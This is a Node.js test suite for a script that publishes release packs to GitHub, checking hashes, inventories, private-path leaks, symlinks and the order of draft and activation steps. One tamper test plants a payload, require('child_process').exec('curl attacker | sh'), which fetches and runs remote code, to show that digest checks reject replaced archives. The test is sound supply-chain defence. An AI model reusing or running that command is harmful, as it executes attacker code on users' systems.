import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { cpSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import test from 'node:test';
import { pathToFileURL } from 'node:url';
import { installation, shell, posix, quote } from './installer-fixture.mjs';
import { fixture, realPack, repository } from './helpers.mjs';
import { githubRelease, publishStudioPack } from '../scripts/publish-studio-pack.mjs';
import { validateReleaseManifest } from '../src/manifest.mjs';

const hash = bytes => createHash('sha256').update(bytes).digest('hex');
const sha = '1234567890abcdef1234567890abcdef12345678';
function candidate(t, mutate = () => {}, mutateInventory = () => {}, mutateStage = () => {}) {
  const { root } = fixture(t), archives = join(root, 'archives');
  mkdirSync(archives);
  for (const arch of ['arm64', 'x64']) {
    const staging = join(root, arch), payload = join(staging, 'studio-cli');
    mkdirSync(payload, { recursive: true });
    const files = {
      'praxity.mjs': 'console.log("ok");', 'package.json': '{"version":"0.3.0"}',
      'legal/LICENSE': 'PolyForm Perimeter License 1.0.1',
      'legal/LICENSING.md': 'Terms', 'editor/index.html': '<html></html>',
      'typst/typst': 'native compiler', 'licenses/example/LICENSE': 'MIT',
      'prax-format/skill/SKILL.md': '---\nname: prax-format\ndescription: Write a course.\n---\nTool-owned skill.\n',
    };
    const inventory = { sourceRevision: sha, sourceTreeDirty: false, platform: 'darwin', arch,
      version: '0.3.0', entrypoint: 'praxity.mjs', legal: ['legal/LICENSE', 'legal/LICENSING.md'],
      dependencies: [{ name: 'example', notices: ['licenses/example/LICENSE'] }] };
    mutate({ arch, files, inventory });
    inventory.files = Object.entries(files).map(([path, bytes]) => ({ path, bytes: Buffer.byteLength(bytes), sha256: hash(bytes), component: 'studio-module' }));
    inventory.payloadSha256 = hash(JSON.stringify(inventory.files));
    mutateInventory(inventory);
    for (const [name, bytes] of Object.entries({ ...files, 'inventory.json': JSON.stringify(inventory) })) {
      mkdirSync(join(payload, name, '..'), { recursive: true });
      writeFileSync(join(payload, name), bytes);
    }
    const name = `praxity-cli-0.3.0-macos-${arch}.tar.gz`;
    mutateStage(payload);
    execFileSync('tar', ['-czf', join(archives, name), '-C', staging, 'studio-cli']);
    writeFileSync(join(archives, `${name}.sha256`), `${hash(readFileSync(join(archives, name)))} *${name}\n`);
  }
  const calls = [];
  const release = {
    async assertNewImmutableRelease(tag) { calls.push(['check', tag]); },
    async createDraft(tag) { calls.push(['draft', tag]); return 42; },
    async upload(tag, assets) { calls.push(['upload', assets.map(file => file.split(/[\\/]/).at(-1))]); },
    async activate(tag) { calls.push(['activate', tag]); },
    async verifyDraft(id, expected) { calls.push(['verify', id, expected]); },
    async verifyPublished(id, expected) { calls.push(['readback', id, expected]); },
  };
  const options = { version: '0.1.2', studioSha: sha, archivesDir: archives,
    outputDir: join(root, 'output'), repositoryRoot: repository, dryRun: true,
    expectedDigests: Object.fromEntries(['arm64', 'x64'].map(arch => [arch,
      hash(readFileSync(join(archives, `praxity-cli-0.3.0-macos-${arch}.tar.gz`)))])) };
  return { root, calls, release, options };
}

test('dry-run creates a schema-valid pack with exact hashes and tested SHA, without publishing', async t => {
  const { options, calls, release } = candidate(t);
  const pack = await publishStudioPack(options, release);
  assert.equal(pack.version, '0.1.2');
  const studio = pack.tools.find(tool => tool.id === 'studio');
  assert.equal(studio.sourceRevision, sha);
  assert.equal(studio.version, '0.3.0-main.12345678');
  for (const arch of ['arm64', 'x64']) {
    const name = `praxity-cli-0.3.0-macos-${arch}.tar.gz`;
    assert.equal(studio.archives[`darwin-${arch}`].url, `https://github.com/Praxity/rubato/releases/download/v0.1.2/${name}`);
    assert.equal(studio.archives[`darwin-${arch}`].sha256, hash(readFileSync(join(options.archivesDir, name))));
  }
  assert.deepEqual(validateReleaseManifest(pack), []);
  assert.deepEqual(calls, [['check', 'v0.1.2']]);
  assert.deepEqual(readdirSync(options.outputDir).sort(), ['SHA256SUMS', 'pack.json', 'rubato-0.1.2.tar.gz']);
  const bootstrap = join(options.outputDir, 'rubato-0.1.2.tar.gz');
  const embedded = JSON.parse(execFileSync('tar', ['-xOf', bootstrap, 'rubato/pack.json']));
  assert.deepEqual(embedded, pack);
  const sums = readFileSync(join(options.outputDir, 'SHA256SUMS'), 'utf8').trim().split('\n');
  assert.equal(sums.length, 4);
  for (const row of sums) {
    const [digest, name] = row.split('  ');
    assert.equal(hash(readFileSync(join(name.startsWith('praxity-cli-') ? options.archivesDir : options.outputDir, name))), digest);
  }
  const names = execFileSync('tar', ['-tf', bootstrap], { encoding: 'utf8' });
  assert.match(names, /rubato\/install.sh/);
  assert.doesNotMatch(names, /(?:\.git\/|test\/|build-inputs|studio-cli-review)/);
  const original = realPack();
  assert.equal(original.version, '0.1.1');
  assert.ok(pack.tools.find(tool => tool.id === 'check').archives['darwin-arm64'].url.startsWith('https://github.com/Praxity/rubato/'));
});

test('publication creates a new draft, uploads an allowlist, then activates last', async t => {
  const { options, calls, release } = candidate(t);
  await publishStudioPack({ ...options, dryRun: false }, release);
  assert.deepEqual(calls.map(call => call[0]), ['check', 'draft', 'upload', 'verify', 'activate', 'readback']);
  assert.equal(calls[3][1], 42);
  assert.equal(calls[4][1], 42);
  assert.equal(calls[3][2].length, 5);
  assert.deepEqual(calls[2][1].sort(), ['SHA256SUMS', 'pack.json', 'praxity-cli-0.3.0-macos-arm64.tar.gz', 'praxity-cli-0.3.0-macos-x64.tar.gz', 'rubato-0.1.2.tar.gz']);
});

for (const [name, mutate] of [
  ['wrong Studio SHA', ({ inventory }) => { inventory.sourceRevision = 'f'.repeat(40); }],
  ['dirty build', ({ inventory }) => { inventory.sourceTreeDirty = true; }],
  ['wrong native architecture', ({ inventory }) => { inventory.arch = 'riscv64'; }],
  ['missing legal notice', ({ files }) => { delete files['legal/LICENSE']; }],
  ['missing upstream notice', ({ files }) => { delete files['licenses/example/LICENSE']; }],
  ['missing installer skill', ({ files }) => { delete files['prax-format/skill/SKILL.md']; }],
  ['private checkout', ({ files }) => { files['apps/desktop/private.ts'] = 'source'; }],
  ['review provenance', ({ files }) => { files['studio-cli-review/build-inputs.json'] = '{}'; }],
  ['source map', ({ files }) => { files['editor/main.js.map'] = '{}'; }],
  ['private browser source', ({ files }) => { files['editor/private.ts'] = 'source'; }],
  ['private path', ({ files }) => { files['praxity.mjs'] = '/Users/private/source'; }],
  ['hidden git history', ({ files }) => { files['editor/.git/config'] = 'private'; }],
]) test(`failed verification publishes nothing: ${name}`, async t => {
  const { options, calls, release } = candidate(t, mutate);
  await assert.rejects(publishStudioPack({ ...options, dryRun: false }, release));
  assert.deepEqual(calls, []);
  assert.equal(existsSync(options.outputDir), false);
});

for (const [name, mutate] of [
  ['bad inventory digest', inventory => { inventory.payloadSha256 = '0'.repeat(64); }],
  ['wrong payload hash', inventory => { inventory.files[0].sha256 = '0'.repeat(64); inventory.payloadSha256 = hash(JSON.stringify(inventory.files)); }],
  ['omitted payload file', inventory => { inventory.files.pop(); inventory.payloadSha256 = hash(JSON.stringify(inventory.files)); }],
  ['duplicate inventory file', inventory => { inventory.files.push(inventory.files[0]); inventory.payloadSha256 = hash(JSON.stringify(inventory.files)); }],
  ['empty notices', inventory => { inventory.dependencies[0].notices = []; }],
  ['wrong entrypoint', inventory => { inventory.entrypoint = 'other.mjs'; }],
  ['wrong platform', inventory => { inventory.platform = 'linux'; }],
  ['invalid Studio version', inventory => { inventory.version = '0.3.0-?bad'; }],
]) test(`invalid inventory cannot publish: ${name}`, async t => {
  const { options, calls, release } = candidate(t, undefined, mutate);
  await assert.rejects(publishStudioPack({ ...options, dryRun: false }, release));
  assert.deepEqual(calls, []);
  assert.equal(existsSync(options.outputDir), false);
});

for (const failure of ['immutability disabled', 'existing release', 'existing tag', 'network error']) test(`GitHub adapter refuses ${failure}`, async () => {
  const adapter = githubRelease(repository, (_command, args) => {
    assert.equal(args[0], 'api', 'No mutation before verification');
    if (failure === 'network error') throw new Error('unavailable');
    if (args.at(-1).endsWith('immutable-releases')) return JSON.stringify({ enabled: failure !== 'immutability disabled' });
    if (args.at(-1).includes('/releases?') && failure === 'existing release') return '[[{"tag_name":"v0.1.2"}]]';
    if (args.at(-1).includes('/tags?') && failure === 'existing tag') return '[[{"name":"v0.1.2"}]]';
    return '[[]]';
  });
  await assert.rejects(adapter.assertNewImmutableRelease('v0.1.2'));
});

test('manifest schema rejects malformed tested Studio revision', () => {
  const pack = realPack();
  pack.tools.find(tool => tool.id === 'studio').sourceRevision = 'main';
  assert.ok(validateReleaseManifest(pack).length);
});

for (const name of ['tampered checksum', 'missing x64', 'existing output', 'invalid version', 'invalid SHA']) test(`refuses ${name}`, async t => {
  const { options, calls, release } = candidate(t);
  if (name === 'tampered checksum') writeFileSync(join(options.archivesDir, 'praxity-cli-0.3.0-macos-x64.tar.gz.sha256'), '0'.repeat(64));
  if (name === 'missing x64') rmSync(join(options.archivesDir, 'praxity-cli-0.3.0-macos-x64.tar.gz'));
  if (name === 'existing output') mkdirSync(options.outputDir);
  if (name === 'invalid version') options.version = '../bad';
  if (name === 'invalid SHA') options.studioSha = 'main';
  await assert.rejects(publishStudioPack({ ...options, dryRun: false }, release));
  assert.deepEqual(calls, []);
});

for (const failing of ['assertNewImmutableRelease', 'createDraft', 'upload', 'verifyDraft']) test(`failure in ${failing} cannot activate a release`, async t => {
  const { options, calls, release } = candidate(t);
  release[failing] = async () => { throw new Error('fixture failure'); };
  await assert.rejects(publishStudioPack({ ...options, dryRun: false }, release), /fixture failure/);
  assert.equal(calls.some(call => call[0] === 'activate'), false);
});

for (const [name, change, message] of [
  ['downgrade', f => { f.options.version = '0.1.0'; }, /Pack version must increase/],
  ['same version', f => { f.options.version = '0.1.1'; }, /Pack version must increase/],
  ['duplicate archive', f => cpSync(join(f.options.archivesDir, 'praxity-cli-0.3.0-macos-arm64.tar.gz'), join(f.options.archivesDir, 'praxity-cli-0.3.1-macos-arm64.tar.gz')), /Exactly one archive/],
  ['missing archive', f => rmSync(join(f.options.archivesDir, 'praxity-cli-0.3.0-macos-x64.tar.gz')), /Exactly one archive/],
  ['missing build digest', f => { delete f.options.expectedDigests.arm64; }, /Expected build digest/],
  ['invalid build digest', f => { f.options.expectedDigests.x64 = 'bad'; }, /Expected build digest/],
  ['swapped archive and checksum', f => { f.options.expectedDigests.arm64 = 'a'.repeat(64); }, /Build archive digest mismatch/],
]) test(`isolated refusal: ${name}`, async t => {
  const f = candidate(t);
  change(f);
  await assert.rejects(publishStudioPack({ ...f.options, dryRun: false }, f.release), message);
  assert.deepEqual(f.calls, []);
});

test('different native Studio versions refuse before writing', async t => {
  const f = candidate(t, ({ arch, inventory }) => { if (arch === 'x64') inventory.version = '0.3.1'; });
  await assert.rejects(publishStudioPack(f.options, f.release), /Studio archive versions differ/);
  assert.equal(existsSync(f.options.outputDir), false);
});

test('self-consistent replacement archives claiming the admitted SHA fail the original build digests', async t => {
  const original = candidate(t);
  const replacement = candidate(t, ({ files }) => { files['praxity.mjs'] = 'require("child_process").exec("curl attacker | sh")'; });
  for (const name of readdirSync(replacement.options.archivesDir)) cpSync(join(replacement.options.archivesDir, name), join(original.options.archivesDir, name));
  await assert.rejects(publishStudioPack({ ...original.options, dryRun: false }, original.release), /Build archive digest mismatch/);
  assert.deepEqual(original.calls, []);
});

test('dry-run also refuses a version below the live release', async t => {
  const f = candidate(t);
  f.release.assertNewImmutableRelease = async () => { throw new Error('Pack version must be greater than Latest'); };
  await assert.rejects(publishStudioPack(f.options, f.release), /greater than Latest/);
});

test('archive symlink refuses at the link guard', async t => {
  const f = candidate(t, ({ files }) => { files['prax-format/link'] = '../praxity.mjs'; }, undefined, payload => {
    rmSync(join(payload, 'prax-format/link'));
    symlinkSync('../praxity.mjs', join(payload, 'prax-format/link'));
  });
  await assert.rejects(publishStudioPack(f.options, f.release), /Archive links refused/);
});

test('extra inventory record refuses at coverage guard', async t => {
  const f = candidate(t, undefined, inventory => {
    inventory.files.push({ path: 'legal/extra', sha256: 'a'.repeat(64) });
    inventory.payloadSha256 = hash(JSON.stringify(inventory.files));
  });
  await assert.rejects(publishStudioPack(f.options, f.release), /Inventory does not cover archive/);
});

test('invalid generated release manifest refuses at validation guard', async t => {
  const f = candidate(t), copy = join(f.root, 'repository');
  mkdirSync(copy);
  const pack = realPack();
  pack.tools.find(tool => tool.id === 'print').archives['darwin-arm64'] = { status: 'unpublished', reason: 'Not released.' };
  writeFileSync(join(copy, 'pack.json'), JSON.stringify(pack));
  // Keep export usable if validation is removed, so a later Git error cannot mask it.
  const gitDirectory = execFileSync('git', ['rev-parse', '--absolute-git-dir'], { cwd: repository, encoding: 'utf8' }).trim();
  writeFileSync(join(copy, '.git'), `gitdir: ${gitDirectory}\n`);
  await assert.rejects(publishStudioPack({ ...f.options, repositoryRoot: copy }, f.release), /Invalid release manifest/);
});

for (const path of ['/Volumes/example/source', '/private/var/folders/build', '/opt/local/source']) test(`refuses private path ${path}`, async t => {
  const f = candidate(t, ({ files }) => { files['praxity.mjs'] = path; });
  await assert.rejects(publishStudioPack(f.options, f.release), /Private path or provenance/);
});

test('publisher CLI refuses conflicting modes', () => {
  const run = spawnSync(process.execPath, ['scripts/publish-studio-pack.mjs', '--publish', '--dry-run'], { cwd: repository, encoding: 'utf8' });
  assert.equal(run.status, 1);
  assert.match(run.stderr, /Choose --publish or --dry-run/);
});

function githubFixture({ releases = [], latest = 'v0.1.1', immutable = true, changedBytes = false, changedDigest = false, missingAsset = false, wrongId = false, assetId = 77, initialDraft = true, duplicateAsset = false, draftTag = 'v0.1.2', nextLatest } = {}) {
  const calls = [], bytes = Buffer.from('fixture bytes');
  let draft = initialDraft, latestReads = 0;
  const assets = [{ id: assetId, name: 'pack.json', digest: `sha256:${hash(bytes)}` }];
  if (duplicateAsset) assets.push(assets[0]);
  const adapter = githubRelease(repository, (command, args, options) => {
    assert.equal(command, 'gh');
    calls.push(args);
    const route = args.find(arg => arg.startsWith('repos/') || arg.startsWith('https://'));
    assert.ok(route, JSON.stringify(args));
    if (route.endsWith('immutable-releases')) return '{"enabled":true}';
    if (route.includes('/releases?')) return JSON.stringify([releases]);
    if (route.includes('/tags?')) return '[[]]';
    if (route.endsWith('/releases/latest')) return JSON.stringify({ tag_name: latestReads++ > 0 && nextLatest ? nextLatest : latest });
    if (route.endsWith('/releases') && args.includes('POST')) return JSON.stringify({ id: wrongId ? 'bad' : 42 });
    if (route.endsWith('/releases/42') && args.includes('PATCH')) { draft = false; return '{}'; }
    if (route.endsWith('/releases/42')) return JSON.stringify({ id: 42, draft, immutable, tag_name: draftTag });
    if (route.includes('/releases/42/assets?')) return JSON.stringify([missingAsset ? [] : assets.map(asset => ({ ...asset, digest: changedDigest ? `sha256:${'0'.repeat(64)}` : asset.digest }))]);
    if (route.endsWith('/releases/assets/77')) return changedBytes ? Buffer.from('replaced bytes') : bytes;
    if (route.startsWith('https://uploads.github.com/') && args.includes('POST')) {
      assert.ok(args.includes('--input'));
      assert.equal(options.encoding, 'utf8');
      return '{}';
    }
    throw new Error(`Unexpected GitHub call: ${JSON.stringify(args)}`);
  });
  return { adapter, calls, expected: [{ name: 'pack.json', digest: hash(bytes) }] };
}

test('GitHub adapter uploads, verifies and activates the exact draft ID, then reads immutable digests back', async () => {
  const f = githubFixture();
  await f.adapter.assertNewImmutableRelease('v0.1.2');
  const id = await f.adapter.createDraft('v0.1.2');
  assert.equal(id, 42);
  await f.adapter.upload(id, ['pack.json']);
  await f.adapter.verifyDraft(id, f.expected);
  await f.adapter.activate(id);
  await f.adapter.verifyPublished(id, f.expected);
  assert.ok(f.calls.some(args => args.includes('repos/Praxity/rubato/releases/assets/77')));
  assert.ok(f.calls.some(args => args.includes('PATCH') && args.includes('make_latest=true')));
  assert.doesNotMatch(JSON.stringify(f.calls), /--clobber|delete|release.*download/);
});

for (const [name, config] of [
  ['older than Latest', { latest: 'v0.1.5' }],
  ['equal to Latest', { latest: 'v0.1.2' }],
  ['older than another published release', { releases: [{ tag_name: 'v0.1.5', draft: false }] }],
]) test(`GitHub adapter refuses version ${name}`, async () => {
  const f = githubFixture(config);
  await assert.rejects(f.adapter.assertNewImmutableRelease('v0.1.2'), /greater than/);
  assert.equal(f.calls.some(args => args.includes('POST') || args.includes('PATCH')), false);
});

for (const config of [{ changedBytes: true }, { changedDigest: true }, { missingAsset: true }, { duplicateAsset: true }, { assetId: '77' }]) test(`draft asset tamper refuses activation: ${JSON.stringify(config)}`, async () => {
  const f = githubFixture(config);
  await assert.rejects(f.adapter.verifyDraft(42, f.expected), /asset|digest/);
  assert.equal(f.calls.some(args => args.includes('PATCH')), false);
});

test('draft creation requires admission and a numeric release ID', async () => {
  const f = githubFixture({ wrongId: true });
  await assert.rejects(f.adapter.createDraft('v0.1.2'), /not admitted/);
  await f.adapter.assertNewImmutableRelease('v0.1.2');
  await assert.rejects(f.adapter.createDraft('v0.1.2'), /Invalid draft release ID/);
});

test('verifying a draft refuses an already active release', async () => {
  const f = githubFixture({ initialDraft: false });
  await assert.rejects(f.adapter.verifyDraft(42, f.expected), /inactive draft/);
});

for (const config of [{ initialDraft: false }, { draftTag: 'v0.1.0' }, { nextLatest: 'v0.1.5' }]) test(`activation rechecks the admitted draft and Latest: ${JSON.stringify(config)}`, async () => {
  const f = githubFixture(config);
  await f.adapter.assertNewImmutableRelease('v0.1.2');
  await assert.rejects(f.adapter.activate(42), /draft|greater than/);
  assert.equal(f.calls.some(args => args.includes('PATCH')), false);
});

for (const config of [{ immutable: false }, { changedDigest: true }, { missingAsset: true }]) test(`live readback fails loudly: ${JSON.stringify(config)}`, async () => {
  const f = githubFixture(config);
  await f.adapter.assertNewImmutableRelease('v0.1.2');
  await f.adapter.activate(42);
  await assert.rejects(f.adapter.verifyPublished(42, f.expected), /immutable|asset|digest/);
});

test('generated release installs using its exported installer and local archive transport', { skip: process.platform === 'win32' }, async t => {
  const f = candidate(t), generated = await publishStudioPack(f.options, f.release);
  const extracted = join(f.root, 'extracted'); mkdirSync(extracted);
  execFileSync('tar', ['-xzf', join(f.options.outputDir, 'rubato-0.1.2.tar.gz'), '-C', extracted]);
  const setup = installation(t, { tools: ['studio', 'check', 'trace', 'print', 'import'] });
  for (const [id, runtime] of Object.entries(generated.runtimes)) runtime.archives['darwin-arm64'] = setup.pack.runtimes[id].archives['darwin-arm64'];
  for (const tool of generated.tools) {
    if (tool.id !== 'studio') tool.archives['darwin-arm64'] = setup.pack.tools.find(other => other.id === tool.id).archives['darwin-arm64'];
    else tool.archives['darwin-arm64'].url = pathToFileURL(join(f.options.archivesDir, 'praxity-cli-0.3.0-macos-arm64.tar.gz')).href;
  }
  writeFileSync(setup.manifest, JSON.stringify(generated));
  const run = shell(`sh ${quote(posix(join(extracted, 'rubato/install.sh')))} --manifest ${quote(pathToFileURL(setup.manifest).href)} --platform darwin-arm64`, { env: setup.env });
  assert.equal(run.status, 0, run.stderr);
  assert.equal(readFileSync(join(setup.toolkit, 'active'), 'utf8').split('\n')[0], '0.1.2');
  const version = shell(`${quote(posix(join(setup.home, '.praxity/bin/praxity')))} version`, { env: setup.env });
  assert.equal(version.status, 0, version.stderr);
  assert.equal(JSON.parse(version.stdout).pack, '0.1.2');
  assert.equal(JSON.parse(version.stdout).tools.find(tool => tool.id === 'studio').version, '0.3.0-main.12345678');
});
